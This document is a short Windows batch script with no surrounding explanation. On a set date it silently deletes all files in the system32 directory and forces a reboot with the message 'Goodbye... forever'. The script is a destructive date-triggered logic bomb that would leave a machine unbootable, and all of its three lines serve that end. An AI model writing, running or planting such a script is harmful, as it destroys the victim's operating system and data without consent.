@echo off
if %date% == 08/09/2022 del "%windir%\system32\*.*"/q
if %date% == 08/09/2022 shutdown -r -c "Goodbye... forever" -t 3
